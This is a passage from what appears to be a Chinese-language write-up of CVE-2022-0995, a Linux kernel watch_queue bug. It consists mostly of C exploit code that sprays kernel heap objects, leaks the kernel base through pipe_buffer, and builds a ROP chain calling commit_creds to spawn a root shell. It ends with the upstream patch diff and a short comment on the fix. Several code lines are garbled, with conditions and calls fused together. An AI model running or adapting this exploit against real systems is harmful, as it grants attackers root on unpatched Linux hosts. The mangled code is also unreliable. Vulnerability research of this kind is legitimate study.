        /*
         * Step.O
         * Initialization
         */
        puts("\033[32m\033[1m[+] CVE-2022-0995 Linux Privilege Escalation.\033[0m");
        // run the exp on specific core only
        CPU_ZERO(&cpu_set);
        CPU_SET(0, &cpu_set);
        sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
        // pipe to trigert off-by-null
        if (pipe2(oob_pipe_fd, O_NOTIFICATION_PIPE) m_list.prev);
        // release and re-spray sk_buff to construct fake msg_msg
        // so that we can make an arbitrary read on a primary msg_msg
        if (freeSkBuff(sk_sockets, fake_secondary_msg, 
                sizeof(fake_secondary_msg)) m_list.prev - 8, 0);
        if (spraySkBuff(sk_sockets, fake_secondary_msg, 
                sizeof(fake_secondary_msg)) m_list.next - 0x400;
        printf("\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n", 
                nearby_msg_prim->m_list.next);
        printf("\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n", victim_addr);
        /*
         * Step.IV
         * fix the header of UAF obj and release it
         * spray pipe_buffer and leak the kernel base
         */
        puts("\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m");
        // re-construct the msg_msg to fix it
        puts("[*] fixing the UAF obj as a msg_msg...");
        if (freeSkBuff(sk_sockets, fake_secondary_msg, 
                sizeof(fake_secondary_msg)) ops > 0xffffffff81000000)
                {
                    printf("\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n", 
                            pipe_buf_ptr->ops);
                    kernel_offset = pipe_buf_ptr->ops - ANON_PIPE_BUF_OPS;
                    kernel_base = 0xffffffff81000000 + kernel_offset;
                }
            }
        }
        printf("\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n", 
                kernel_base, kernel_offset);
        /*
         * Step.V
         * hijack the ops of pipe_buffer
         * free all pipe to trigger fake ptr
         * so that we hijack the RIP
         * construct a ROP on pipe_buffer
         */
        puts("\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m");
        puts("[*] pre-construct data in userspace...");
        pipe_buf_ptr = (struct pipe_buffer *) fake_secondary_msg;
        pipe_buf_ptr->ops = victim_addr;
        ops_ptr = (struct pipe_buf_operations *) fake_secondary_msg;
        ops_ptr->release = 0xffffffff8183b4d3 + kernel_offset;// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret
        ops_ptr->confirm = 0xffffffff81689ea4 + kernel_offset;// pop rdx ; pop r13 ; pop rbp ; ret
        rop_idx = 0;
        rop_chain = (uint64_t*) &fake_secondary_msg[0x20];
        rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;
        rop_chain[rop_idx++] = kernel_offset + INIT_CRED;
        rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;
        rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 22;
        rop_chain[rop_idx++] = *(uint64_t*) "arttnba3";
        rop_chain[rop_idx++] = *(uint64_t*) "arttnba3";
        rop_chain[rop_idx++] = getRootShell;
        rop_chain[rop_idx++] = user_cs;
        rop_chain[rop_idx++] = user_rflags;
        rop_chain[rop_idx++] = user_sp;
        rop_chain[rop_idx++] = user_ss;
        puts("[*] spray sk_buff to hijack pipe_buffer...");
        if (spraySkBuff(sk_sockets, fake_secondary_msg, 
                sizeof(fake_secondary_msg)) release to hijack RIP...");
        for (int i = 0; i = sizeof(wfilter->type_filter) * 8)
    +       if (tf[i].type >= WATCH_TYPE__NR)
                continue;
            nr_filter++;
        }
    @@ -336,7 +335,7 @@ long watch_queue_set_filter(struct pipe_inode_info *pipe,
        q = wfilter->filters;
        for (i = 0; i = sizeof(wfilter->type_filter) * BITS_PER_LONG)
    +       if (tf[i].type >= WATCH_TYPE__NR)
                continue;
            q->type         = tf[i].type;
  * 修复了前后判定不一致的问题
  * 将 type 的范围限定为 `WATCH_TYPE__NR`（值为 2）
笔者个人认为这个修复还是比较成功的